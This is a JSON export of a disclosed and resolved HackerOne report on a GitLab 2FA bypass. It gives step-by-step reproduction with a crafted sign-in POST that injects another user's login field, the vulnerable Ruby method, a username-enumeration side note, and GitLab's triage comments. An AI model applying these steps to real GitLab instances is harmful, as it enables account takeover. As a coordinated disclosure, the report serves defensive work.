{"id":128085,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMjgwODU=","url":"https://hackerone.com/reports/128085","title":"Bypassing password authentication of users that have 2FA enabled","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2016-04-04T01:43:51.988Z","submitted_at":"2016-04-04T01:43:51.988Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"jobert","url":"/jobert","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":264,"url":"https://hackerone.com/gitlab","handle":"gitlab","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"GitLab","twitter_handle":"gitlab","website":"https://about.gitlab.com","about":"A single application for the entire software development lifecycle."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2016-04-18T06:59:28.512Z","bug_reporter_agreed_on_going_public_at":"2016-04-14T20:27:32.135Z","team_member_agreed_on_going_public_at":"2016-04-18T06:59:28.439Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"# Proof of Concept\nWhen a user has 2FA enabled, it's possible to sign in as that user without the need to know its password. To reproduce this attack, you need two users that both have 2FA enabled. For the sake of this PoC, lets call them Jane and John. Jane is the attacker and wants to get access to John's account. John his username is `john`. Jane knows John's username. Here's how you can reproduce it:\n\n - as Jane, go to the sign in page and enter your username and password\n - in the background, it sets Jane's user ID in `session[:otp_user_id]`\n - you now need to enter Jane's 2FA code in order to get access to the account\n - now intercept all your network traffic with a tool like Burp Suite and capture the request that is send when you submit the 2FA token - it looks like this:\n\n```\n\u003e POST /users/sign_in HTTP/1.1\n\u003e Host: 159.xxx.xxx.xxx\n\u003e ...\n\n\u003e ----------1881604860\n\u003e Content-Disposition: form-data; name=\"user[otp_attempt]\"\n\u003e \n\u003e 212421\n\u003e ----------1881604860--\n```\n\n - now add the `login` header to the request - the request now looks like:\n\n```\n\u003e POST /users/sign_in HTTP/1.1\n\u003e Host: 159.xxx.xxx.xxx\n\u003e ...\n\n\u003e ----------1881604860\n\u003e Content-Disposition: form-data; name=\"user[otp_attempt]\"\n\u003e \n\u003e 212421\n\u003e ----------1881604860\n\u003e Content-Disposition: form-data; name=\"user[login]\"\n\u003e \n\u003e john\n\u003e ----------1881604860--\n```\n\n - now, instead of `212421`, send a valid OTP code for `john` to the server\n - Jane is now signed in as John by entering her own password and John's OTP code - Jane still doesn't know John's password\n\n# Impact\nThe OTP codes are 6 numbers that change every 30 seconds. I haven't looked whether the server allows time drift. This would increase the chance that an attacker guesses the right OTP code for the account. As a PoC, I could run a small attack against GitLab.com, but I haven't been able to reach @sytsem to ask for permission. ;)\n\n# Origin of the issue \nThis issue originates from the `find_user` method in the `SessionsController`. It returns a `User` object in two different ways: the first returns the object based on `params[:login]` parameter. The second one if `sessions[:otp_user_id]`. The `params[:login]` parameter takes precedence over the ID stored in the session. This means that if the `params[:login]` is specified in the request when the 2FA code needs to be verified, a different user can be selected to verify the code against. Here's the method:\n\n```ruby\n# app/controllers/sessions_controller.rb:58\ndef find_user\n  if user_params[:login]\n    User.by_login(user_params[:login])\n  elsif user_params[:otp_attempt] \u0026\u0026 session[:otp_user_id]\n    User.find(session[:otp_user_id])\n  end\nend\n```\n\n# Fix\nHere's a fix (needs specs to proof that it works): F83019.","weakness":{"id":27,"name":"Improper Authentication - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":83019,"file_name":"2fa-password-bypass.diff","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/083/019/95fc79353e8b6294611e55df7cbb7901e61f8f61/2fa-password-bypass.diff?response-content-disposition=attachment%3B%20filename%3D%222fa-password-bypass.diff%22%3B%20filename%2A%3DUTF-8%27%272fa-password-bypass.diff\u0026response-content-type=text%2Fx-diff\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRJF6VFL6%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T133633Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJGMEQCID1So1KYRjOmBFJqLsqO1j9SSUCF9kJ%2FHqahOyDLmrnJAiAr2q5Z8bAgCyaCmyDSz7xwtmUTDOoz04myJOluBHRCeyqDBAju%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMvFUMWX6P00RsVarQKtcDflFFNScU3coA1YbnKy4lPXtwGDNsJcqhfcCTaePuAuK6nWvl5xRbjzjOBPvBHaTAnb2Iw%2B6Jdj2uyjmRMn%2F5%2F5AzD5di2wWOcC0am9iLaFmORG4VIVXTc8aAiiwqjNAu7dH2hTUNL9bwPzYUBq3%2FjwvNZUM%2FmpdXfugOwAP%2FP3w9e9PqozA16XzrwGIunimlg58HKZfOM0xp%2FESLFXRHAssX6DaYqQQyV5%2F0triAQeOx328GOBUjfGTiAl1aoS1J0%2FqN%2BmywXW%2FqqkEfAQ2n2f18dX2dkbwMnyQ4F47zR6jJw3CdBkeCPRDbbhcu8YGu2%2F%2BzzM9B4uguhR76M3KYB3dr919eRp%2F%2BcOfUxc8TC3gXMmp1jh0ywwC27sBrzUgZdh%2B2g4artPxRaRZPHbQvC%2F1OZ0MxZYsQmEItbUc65WqfO6PSdLbymEFDMyN5ona14j%2BaQHfp1MWNaO02I2WPYO5mZIsPuHjCO5MYUldcsrZMP7pydKVo87gkO2fPB2orxw1RGazxVwGy5R2PDIV7HsKH4KSOqhGLTTYcSjZvxzmTWIy013yrXhU3CEdFUoB7QifSN1bUli2cMIaUe7sr75onhlaNnQxqLv%2By7jqQ9RiOHvcMM4XIMInwkIsGOqYBzgDHFUI%2FtkToYUBHsGsXyI9vGkS81IUV4PSjgSfvCFIGR%2BPjro3EYi30Oc%2FQZijhik3H1oI82Vno5zo%2BVnueR7%2BkGCloKvMkJAe%2F77e%2BPPRDClquvRG9ERm7ELsd6WvljYOJTmuP4pWPW%2B2d%2BQu26lThNein0I5abJKiu%2FYvnXDmBeYAgLMwbyg9Lq3qT5qMKsr3i1aOgHcGHtYldnzNcLqwaNJYhw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=2b45654008760dd7954227c49911c4286cf976ce9ac6508ce2b6f0aa6f1c5160","file_size":1025,"type":"text/x-diff"}],"allow_singular_disclosure_at":"2016-05-14T20:27:32.220Z","allow_singular_disclosure_after":-170701741.18354645,"singular_disclosure_allowed":true,"vote_count":17,"voters":["michiel","spam404","eveeez","mr_n30","pavanw3b","infosechelper","silv3rpoision","bb00x","spetr0x","safisec","and 7 more..."],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":886683,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"As a side-note: this also leaks if someone has 2FA enabled. If the request is sent with a `username` or `email` from someone that doesn't have 2FA enabled, the server responds with the error \"Invalid username/password\". In case the user has 2FA enabled, it responds with \"Invalid two-factor code\". To proof this, @douwem has 2FA enabled (good job!) on gitlab.com and @sytse hasn't (you should enable it ;).","automated_response":false,"created_at":"2016-04-04T03:21:04.318Z","updated_at":"2016-04-04T03:21:04.318Z","actor":{"username":"jobert","cleared":true,"url":"/jobert","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":887950,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi Jobert,\n\nThank you for reporting. We have published this report internally and will be looking into it with our security team. I'll keep you up to date with our progress but feel free to get in touch with us at security@gitlab.com for additional followup or to request further attention to a report. We have also received your other reports and will proceed accordingly.\n\nAdditionally I'de like to point out that I appreciate the quality of the reports especially this one. I'll be in touch as soon as possible. \n\nBest regards,\n\nJosé Torres\nGitLab Inc.","automated_response":false,"created_at":"2016-04-04T17:35:30.022Z","updated_at":"2016-04-04T17:35:30.022Z","actor":{"username":"jose","cleared":false,"url":"/jose","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/050/961/83699f83df390864b839d65a6015259d60791068_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":887951,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","automated_response":false,"created_at":"2016-04-04T17:35:47.126Z","updated_at":"2016-04-04T17:35:47.126Z","actor":{"username":"jose","cleared":false,"url":"/jose","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/050/961/83699f83df390864b839d65a6015259d60791068_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":891184,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi Jobert,\n\nGreat report, thank you. Just letting you know that this has been confirmed and scheduled to be released in a patch on the current version.  I'll report back with further updates. Feel free to get in touch with us through security@gitlab.com. \n\nBest regards,\n\nJosé Torres\nGitLab B.V.","automated_response":false,"created_at":"2016-04-06T05:35:27.086Z","updated_at":"2016-04-06T05:35:27.086Z","actor":{"username":"jose","cleared":false,"url":"/jose","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/050/961/83699f83df390864b839d65a6015259d60791068_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":906688,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thank you Jobert for reporting. \n\nWe look forward to further reports. Feel free to get in touch with us through security@gitlab.com or open a new report here.\n\nBest,\n\nJosé Torres\nGitLab B.V.","automated_response":false,"created_at":"2016-04-14T20:26:03.190Z","updated_at":"2016-04-14T20:26:03.190Z","actor":{"username":"jose","cleared":false,"url":"/jose","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/050/961/83699f83df390864b839d65a6015259d60791068_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"jobert","url":"/jobert"},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":906690,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Thanks for the quick turnaround @jose, I'll definitely keep looking for more!","automated_response":false,"created_at":"2016-04-14T20:27:32.156Z","updated_at":"2016-04-14T20:27:32.156Z","first_to_agree":true,"actor":{"username":"jobert","cleared":true,"url":"/jobert","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":911063,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2016-04-18T06:59:28.470Z","updated_at":"2016-04-18T06:59:28.470Z","actor":{"username":"jose","cleared":false,"url":"/jose","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/050/961/83699f83df390864b839d65a6015259d60791068_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":911064,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2016-04-18T06:59:28.532Z","updated_at":"2016-04-18T06:59:28.532Z","actor":{"username":"jose","cleared":false,"url":"/jose","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/050/961/83699f83df390864b839d65a6015259d60791068_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"id":1677,"category":"researcher","content":"This vulnerability allowed password authentication to be bypassed when two-factor authentication was enabled for a user. @GitLab resolved this 2 days after I reported it to them. The commit that fixed the bug can be found at https://gitlab.com/gitlab-org/gitlab-ce/commit/00da609cfd8bf1105fe433dfc92ab263d6205eaf. The bug has been fixed in GitLab version 8.6.5.","can_view?":true,"can_create?":false,"attachments":[],"user":{"id":2,"username":"jobert","name":"Jobert Abma","bio":"Co-founder of HackerOne. ಠ_ಠ","cleared":true,"website":"https://hackerone.com","location":"San Francisco, CA","created_at":"2013-03-08T01:17:12.256Z","url":"https://hackerone.com/jobert","anc_triager":false,"hackerone_triager":false,"hackerone_employee":true,"hacker_resume_enabled":true,"user_type":"legacy","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c","xtralarge":"https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/c11036e2d3f8b05af4b5da5984ccdec6f786b763c8abceb4e68042e10dcdae85"}}}]}